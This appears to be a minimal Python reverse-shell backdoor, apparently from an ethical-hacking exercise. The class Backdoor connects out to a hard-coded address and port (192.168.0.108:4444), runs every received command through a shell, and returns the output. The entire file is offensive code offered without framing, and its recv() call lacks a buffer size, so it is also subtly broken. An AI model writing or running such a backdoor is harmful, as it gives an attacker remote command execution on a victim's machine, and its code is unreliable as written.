#!/usr/bin/env python3
import json
import socket
import subprocess


class Backdoor:
    def __init__(self,ip,port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((ip, port))
        self.conn.send("\n[+] Connecting established\n".encode("utf-8"))

    def execute_system_command(self,command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode("utf-8"))

    def run(self):
        while True:
            recv_data = self.conn.recv()
            if recv_data.decode("utf-8") in ["quit\n", "exit\n"]:
                break
            cmd_result = self.execute_system_command(recv_data.decode("utf-8"))
            self.reliable_send(cmd_result.decode("utf-8"))
        self.conn.close()

backdoor = Backdoor("192.168.0.108",4444)
backdoor.run()
